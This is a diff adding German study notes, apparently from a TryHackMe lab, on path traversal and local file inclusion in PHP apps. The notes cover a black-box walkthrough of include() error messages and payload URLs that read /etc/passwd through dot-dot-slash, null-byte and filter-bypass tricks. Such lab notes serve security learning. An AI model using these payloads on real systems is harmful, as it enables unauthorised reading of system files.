@@ -41,6 +41,13 @@ Intressant Locations an die man Navigieren kann
 |`/var/log/apache2/access.log`|the accessed requests for `Apache` web server|
 |`C:\boot.ini`|contains the boot options for computers with BIOS firmware|
 
+
+#### Current Directory Trick
+Wird Genutzt wenn der Developer begriffe/Pfade gefiltert hat wie z.B. /etc/passwd
+Was man jetzt machen kann ist der "Current Directory Trick" dieser funktioniert ähnlich wie "cd". Während cd.. uns ein Directory nach oben bringt bleibt cd. im selben Directory 
+Bsp.:
+http://webapp.thm/index.php?lang=/etc/passwd/.
+
 ### LFI
 
 Kann wie Path Traversal die dot dot Slash methode Benutzen. Kann aber auch schon jenachdem einfachere Variante nutzen 
@@ -55,3 +62,44 @@ Wenn ein Directory Spezifiziert ist kann die Dot Dot Slash methode verwendet wer
 Bsp.:
 http://10.10.208.102/lab2.php?file=../../../../etc/passwd
 
+
+Vorgehen beim Angreifen einer "Black Box"
+Bsp.:
+Entry Point 
+http://webapp.thm/index.php?lang=EN
+Beim eingeben eines Inputs kommt diese Fehlermeldung
+```
+Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+```
+Was Erfahren wir aus der Meldung? 
+-> Da wir THM als input genommen haben erfahren wir das es eine Include Funktion gibt (So im etwa: include(languages/THM.php);)
+-> Wir sehen das der Input via PHP gehandelt wird
+-> Der Pfad der Applikation ist /var/www/html/THM-4/
+
+	-> Mögliche Angriffmethodik ist Dot Dot Slash 
+	http://webapp.thm/index.php?lang=../../../../etc/passwd
+
+Fehlermeldung aus dem Befehl:
+
+```
+Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+```
+Rückschlüsse aus der Meldung: 
+-> Anscheinend sind wir aus dem Verzeichniss raus gekommen allerdings wird an den input noch .php gehangen
+-> das .php kann via eines NULLBYTES entfernt werden (%00)
+- Modifizierte Angriffsmethodik:
+- http://webapp.thm/index.php?lang=../../../../etc/passwd%00
+**Note:** the %00 trick is fixed and not working with PHP 5.3.4 and above.
+
+#### Was Tun wenn ../ durch durch Leerzeichen Ersetzt?
+
+Einfach da nur der erste Substring durch PHP ersetzt wird kann man das wie Folgt bypassen: 
+ ....//....//....//....//....//etc/passwd
+ Bildliche Erklärung:
+ https://imgur.com/aYrz6QC
+
+#### Was tun wenn der Dev die Anfrage Forced durch ein Spezielles Directory laufen zu lassen?
+Beispielpfad:
+http://webapp.thm/index.php?lang=languages/EN.php
+kann wie Folgt ausgehebelt werden: 
+http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd
